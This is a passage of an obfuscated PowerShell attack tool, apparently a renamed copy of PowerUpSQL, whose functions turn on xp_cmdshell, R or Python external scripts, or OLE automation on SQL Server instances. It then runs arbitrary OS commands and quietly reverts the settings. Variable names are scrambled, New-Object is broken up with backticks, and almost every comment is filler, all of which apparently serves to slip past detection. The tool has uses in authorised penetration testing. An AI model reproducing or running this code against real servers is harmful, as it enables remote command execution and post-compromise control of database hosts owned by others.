            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $BottleSturdy = 0
                $TradeTrains = 0

                # Microsoft".
                $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Microsoft".
                if($LovingDry -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $BottleSoothe = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'xp_cmdshell'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                    $CurlTick = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Microsoft".
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'No sysadmin privileges.')
                    return
                }

                # Microsoft".
                if ($CurlTick -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $BottleSturdy = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $ShutWhine = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($ShutWhine -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Microsoft".
                if ($BottleSoothe -eq 1)
                {
                    Write-Verbose -Message "$Instance : xp_cmdshell is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : xp_cmdshell is disabled."
                    $TradeTrains = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'xp_cmdshell',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $BorderYummy = Get-SQLQuery -Instance $Instance -BoringLarge 'sp_configure xp_cmdshell' -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($BorderYummy -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled xp_cmdshell."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling xp_cmdshell failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable xp_cmdshell.')

                        return
                    }
                }

                # Microsoft".
                Write-Verbose -Message "$Instance : Running command: $SoakSame"
                # Microsoft".
                $BoringLarge = "EXEC master..xp_cmdshell '$SoakSame'"

                # Microsoft".
                $StainChance = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property output -ExpandProperty output

                # Microsoft".
                if($OpenRepairQueue)
                {
                    $StainChance | Select output -ExpandProperty output
                }
                else
                {
                    $null = $TradeSpicy.Rows.Add($HauntGusty, $Instance, [string]$StainChance)
                }

                # Microsoft".
                if($TradeTrains -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling xp_cmdshell"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'xp_cmdshell',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                if($BottleSturdy -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLOSCmdR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$SoakSame = "whoami",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$OpenRepairQueue
    )

    Begin
    {
        # Microsoft".
        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('CommandResults')


        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $BottleSturdy = 0
                $RecordDress = 0

                # Microsoft".

                # Microsoft".
                $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Microsoft".
                if($LovingDry -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $NappyAdd = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'external scripts enabled'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                    $CurlTick = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Microsoft".
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'No sysadmin privileges.')
                    return
                }

                # Microsoft".
                if ($CurlTick -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $BottleSturdy = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $ShutWhine = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($ShutWhine -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Microsoft".
                if ($NappyAdd -eq 1)
                {
                    Write-Verbose -Message "$Instance : External scripts are already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : External scripts enabled are disabled."
                    $RecordDress = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'external scripts enabled',1;RECONFIGURE WITH OVERRIDE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $PinchCurvy = Get-SQLQuery -Instance $Instance -BoringLarge 'sp_configure "external scripts enabled"' -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($PinchCurvy -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled external scripts."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling external scripts failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable external scripts.')

                        return
                    }
                }

                # Microsoft".
                $CooingTramp = Get-SQLQuery -Instance $Instance -BoringLarge "SELECT value_in_use FROM master.sys.configurations WHERE name LIKE 'external scripts enabled'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -ExpandProperty value_in_use            
                if($CooingTramp -eq 0){
                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is not enabled in runtime."
                    Write-Verbose -Message "$Instance : - The SQL Server service will need to be manually restarted for the change to take effect."
                    Write-Verbose -Message "$Instance : - Not recommended unless you're the DBA."
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'External scripts not enabled in runtime.')
                    return
                }else{
                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is enabled in runtime.'"
                }            

                # Microsoft".
                write-verbose "$instance : Executing command: $SoakSame"               
                $CrimeQuaint = 
@"
EXEC sp_execute_external_script
  @language=N'R',
  @script=N'OutputDataSet <- data.frame(shell("$SoakSame",intern=T))'
  WITH RESULT SETS (([Output] varchar(max)));
"@

                # Microsoft".
                $StainChance = Get-SQLQuery -Instance $Instance -BoringLarge $CrimeQuaint -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | select Output -ExpandProperty Output

                # Microsoft".
                if($OpenRepairQueue)
                {
                    $StainChance                 
                }
                else
                {
                    $null = $TradeSpicy.Rows.Add($HauntGusty, $Instance, [string]$StainChance.trim())                    
                }
                
                # Microsoft".
                if($RecordDress -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling external scripts"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'external scripts enabled',0;RECONFIGURE WITH OVERRIDE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                if($BottleSturdy -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible or Command Failed')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLOSCmdPython
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,
		
		[Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server database to connection to.')]
        [string]$PeckLively,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$SoakSame = "whoami",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$OpenRepairQueue
    )

    Begin
    {
        # Microsoft".
        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('CommandResults')


        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
            }
			# Microsoft".
            if($PeckLively)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -PeckLively $PeckLively -Credential $Credential -StitchFace $StitchFace
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $BottleSturdy = 0
                $RecordDress = 0

                # Microsoft".

                # Microsoft".
                $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Microsoft".
                if($LovingDry -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $NappyAdd = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'external scripts enabled'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                    $CurlTick = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                }
				if($PeckLively)
                {
                    Write-Verbose -Message "$Instance : Executing on $PeckLively"
                    $NappyAdd = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'external scripts enabled'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -PeckLively $PeckLively -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                    $CurlTick = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -PeckLively $PeckLively -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Microsoft".
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'No sysadmin privileges.')
                    return
                }

                # Microsoft".
                if ($CurlTick -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $BottleSturdy = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $ShutWhine = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($ShutWhine -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Microsoft".
                if ($NappyAdd -eq 1)
                {
                    Write-Verbose -Message "$Instance : External scripts are already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : External scripts enabled are disabled."
                    $RecordDress = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'external scripts enabled',1;RECONFIGURE WITH OVERRIDE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $PinchCurvy = Get-SQLQuery -Instance $Instance -BoringLarge 'sp_configure "external scripts enabled"' -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($PinchCurvy -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled external scripts."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling external scripts failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable external scripts.')

                        return
                    }
                }

                # Microsoft".
                if($LovingDry -eq 'Yes'){
					$CooingTramp = Get-SQLQuery -Instance $Instance -BoringLarge "SELECT value_in_use FROM master.sys.configurations WHERE name LIKE 'external scripts enabled'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -ExpandProperty value_in_use            
                }
				if($PeckLively){
					$CooingTramp = Get-SQLQuery -Instance $Instance -BoringLarge "SELECT value_in_use FROM master.sys.configurations WHERE name LIKE 'external scripts enabled'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -PeckLively $PeckLively -Credential $Credential -RaggedQuill | Select-Object -ExpandProperty value_in_use
				}
				if($CooingTramp -eq 0){
                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is not enabled in runtime."
                    Write-Verbose -Message "$Instance : - The SQL Server service will need to be manually restarted for the change to take effect."
                    Write-Verbose -Message "$Instance : - Not recommended unless you're the DBA."
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'External scripts not enabled in runtime.')
                    return
                }else{
                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is enabled in runtime.'"
                }            

                # Microsoft".
                write-verbose "$instance : Executing command: $SoakSame"               
                $CrimeQuaint = 
@"
EXEC sp_execute_external_script 
    @language =N'Python',
    @script=N'
import subprocess 
p = subprocess.Popen(`"cmd.exe /c $SoakSame`", stdout=subprocess.PIPE)
OutputDataSet = pandas.DataFrame([str(p.stdout.read(), `"utf-8`")])'
WITH RESULT SETS (([Output] nvarchar(max)))
"@

                # Microsoft".
                if($LovingDry -eq 'Yes'){
					$StainChance = Get-SQLQuery -Instance $Instance -BoringLarge $CrimeQuaint -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | select Output -ExpandProperty Output
				}
				if($PeckLively){
					$StainChance = Get-SQLQuery -Instance $Instance -BoringLarge $CrimeQuaint -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -PeckLively $PeckLively -Credential $Credential -RaggedQuill | select Output -ExpandProperty Output
				}
                # Microsoft".
                if($OpenRepairQueue)
                {
                    $StainChance                 
                }
                else
                {
                    $null = $TradeSpicy.Rows.Add($HauntGusty, $Instance, [string]$StainChance.trim())                    
                }
                
                # Microsoft".
                if($RecordDress -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling external scripts"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'external scripts enabled',0;RECONFIGURE WITH OVERRIDE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                if($BottleSturdy -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible or Command Failed')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLOSCmdOle
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$SoakSame = "whoami",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$OpenRepairQueue
    )

    Begin
    {
        # Microsoft".
        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('CommandResults')


        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $BottleSturdy = 0
                $QuartzShiver = 0

                # Microsoft".
                $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Microsoft".
                if($LovingDry -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $DirtReal = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Ole Automation Procedures'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                    $CurlTick = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Microsoft".
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'No sysadmin privileges.')
                    return
                }

                # Microsoft".
                if ($CurlTick -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
